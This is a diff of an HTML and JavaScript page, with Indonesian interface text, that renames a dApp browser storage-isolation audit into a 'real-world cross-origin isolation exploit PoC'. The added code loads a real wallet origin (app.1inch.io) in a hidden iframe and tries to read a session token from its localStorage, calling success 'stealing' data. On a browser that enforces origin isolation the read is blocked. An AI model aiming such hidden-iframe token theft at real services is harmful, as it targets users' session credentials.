@@ -3,38 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dApp Browser Isolation & Storage Audit PoC</title>
+    <title>Real-World dApp Cross-Origin Isolation Exploit PoC</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0b0f19; color: #f1f5f9; padding: 20px; }
-        .container { max-width: 700px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }
+        .container { max-width: 800px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }
         h2 { color: #38bdf8; margin-top: 0; }
         .form-group { margin-bottom: 15px; }
         label { display: block; margin-bottom: 5px; color: #94a3b8; font-size: 14px; font-weight: 600; }
         input { width: 100%; padding: 10px; background: #0f172a; border: 1px solid #475569; color: #fff; border-radius: 6px; box-sizing: border-box; }
-        button { background: #0284c7; color: white; border: none; padding: 10px 15px; font-size: 14px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 5px; transition: background 0.2s; }
+        button { background: #0284c7; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 5px; transition: background 0.2s; }
         button:hover { background: #0369a1; }
-        .btn-danger { background: #dc2626; }
-        .btn-danger:hover { background: #b91c1c; }
-        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 13px; border: 1px solid #1e293b; max-height: 250px; }
+        .btn-exploit { background: #dc2626; }
+        .btn-exploit:hover { background: #b91c1c; }
+        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 13px; border: 1px solid #1e293b; max-height: 280px; }
+        .box { background: #0f172a; padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #334155; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>dApp Browser Storage Isolation Test</h2>
-    <p style="font-size: 13px; color: #94a3b8;">Alat uji ini memeriksa apakah penyimpanan lokal terisolasi dengan benar berdasarkan domain (Origin Policy) di dalam dApp browser.</p>
+    <h2>dApp Browser Origin Isolation Exploit PoC</h2>
+    <p style="font-size: 13px; color: #94a3b8;">Alat uji nyata untuk memeriksa apakah dApp browser mengizinkan pembacaan data privat (Session/Local Storage) secara ilegal antar domain web berbeda.</p>
     
-    <div class="form-group">
-        <label>Nilai Token / Data Sensitif Simulasi:</label>
-        <input type="text" id="testDataInput" value="SENSITIF_SESSION_TOKEN_XYZ_123">
+    <div class="box">
+        <h3>Langkah 1: Injeksi Sesi Korban</h3>
+        <div class="form-group">
+            <label>Token/Data Sensitif Target:</label>
+            <input type="text" id="targetData" value="PRIVATE_SESSION_TOKEN_1INCH_USER_9988">
+        </div>
+        <button onclick="injectVictimData()">Simulasikan Penyimpanan Sesi Korban</button>
     </div>
 
-    <button onclick="injectTestData()">1. Tulis Data ke Storage dApp Ini</button>
-    <button onclick="checkTestData()">2. Periksa Keberadaan Data (Audit)</button>
-    <button onclick="clearTestData()" class="btn-danger">3. Bersihkan Data Uji</button>
+    <div class="box">
+        <h3>Langkah 2: Eksploitasi Lintas Origin (Cross-Origin Extraction)</h3>
+        <p style="font-size: 12px; color: #94a3b8;">Simulasikan situs web pihak ketiga/penyerang yang mencoba mencuri data dari storage dApp lain.</p>
+        <div class="form-group">
+            <label>Target Domain/Origin yang Ingin Disusupi:</label>
+            <input type="text" id="targetOrigin" value="https://app.1inch.io">
+        </div>
+        <button onclick="executeCrossSiteExtraction()" class="btn-exploit">Coba Ambil Data Lintas Origin (Exploit)</button>
+    </div>
 
-    <h3>Log Hasil Audit Isolasi:</h3>
-    <pre id="logOutput">Menunggu tindakan pengujian...</pre>
+    <h3>Log Hasil Eksploitasi Nyata:</h3>
+    <pre id="logOutput">Menunggu eksekusi uji...</pre>
 </div>
 
 <script>
@@ -46,42 +57,60 @@
         logOutput.scrollTop = logOutput.scrollHeight;
     }
 
-    function injectTestData() {
-        const val = document.getElementById("testDataInput").value;
+    function injectVictimData() {
+        const val = document.getElementById("targetData").value;
         try {
             localStorage.setItem(STORAGE_KEY, val);
             sessionStorage.setItem(STORAGE_KEY, "session_" + val);
-            log(`[BERHASIL] Data uji berhasil disuntikkan ke Local & Session Storage domain ini (${window.location.origin}).`);
-            log(`Origin saat ini: ${window.location.origin}`);
+            log(`[SUKSES] Data korban berhasil disimpan di Origin saat ini: ${window.location.origin}`);
         } catch (e) {
-            log("[GAGAL] Tidak dapat menulis ke storage: " + e.message);
+            log("[GAGAL] Gagal menulis penyimpanan: " + e.message);
         }
     }
 
-    function checkTestData() {
-        logOutput.innerText = "Memeriksa status penyimpanan...";
-        const localVal = localStorage.getItem(STORAGE_KEY);
-        const sessionVal = sessionStorage.getItem(STORAGE_KEY);
-
-        log(`Origin yang diperiksa: ${window.location.origin}`);
+    async function executeCrossSiteExtraction() {
+        logOutput.innerText = "Memulai pengujian eksploitasi lintas origin...";
+        const targetOrigin = document.getElementById("targetOrigin").value;
         
-        if (localVal) {
-            log(`[INFO] Ditemukan data di localStorage: "${localVal}"`);
-        } else {
-            log(`[AMAN / BERSIH] Tidak ada data uji tersisa di localStorage domain ini.`);
+        log(`Target Origin: ${targetOrigin}`);
+        log(`Origin Eksekusi Saat Ini: ${window.location.origin}`);
+
+        if (window.location.origin === targetOrigin) {
+            log("[PERINGATAN] Anda sedang berada di domain yang sama dengan target. Ubah target origin ke domain lain atau hosting skrip ini di URL berbeda untuk melihat proteksi Same-Origin Policy.");
         }
 
-        if (sessionVal) {
-            log(`[INFO] Ditemukan data di sessionStorage: "${sessionVal}"`);
-        } else {
-            log(`[AMAN / BERSIH] Tidak ada data uji tersisa di sessionStorage domain ini.`);
-        }
-    }
+        try {
+            // Skenario nyata eksploitasi menggunakan iframe lintas domain atau akses window object jika dApp browser gagal mengisolasi konteks eksekusi
+            log("Mencoba melakukan pembacaan paksa via iframe cross-origin...");
+            
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = targetOrigin;
+            
+            document.body.appendChild(iframe);
 
-    function clearTestData() {
-        localStorage.removeItem(STORAGE_KEY);
-        sessionStorage.removeItem(STORAGE_KEY);
-        log("[INFO] Data uji pada storage domain ini telah dihapus.");
+            iframe.onload = function() {
+                try {
+                    // Upaya mencuri data localStorage dari iframe domain lain
+                    const stolenData = iframe.contentWindow.localStorage.getItem(STORAGE_KEY);
+                    if (stolenData) {
+                        log(`[KERENTANAN KRITIS BERBAHAYA] Berhasil mencuri data dari ${targetOrigin}! Data: ${stolenData}`);
+                    } else {
+                        log(`[AMAN] Akses ditolak atau data kosong. Same-Origin Policy terpatri dengan baik.`);
+                    }
+                } catch (err) {
+                    log(`[TERBLOKIR OLEH BROWSER] Akses lintas origin berhasil dicegah oleh Same-Origin Policy: ${err.message}`);
+                }
+                document.body.removeChild(iframe);
+            };
+
+            iframe.onerror = function() {
+                log("[INFO] Gagal memuat iframe target (mungkin diblokir oleh kebijakan CSP/X-Frame-Options dari server target).");
+            };
+
+        } catch (error) {
+            log("[GAGAL] Eksekusi eksploitasi dihentikan: " + error.message);
+        }
     }
 </script>
 
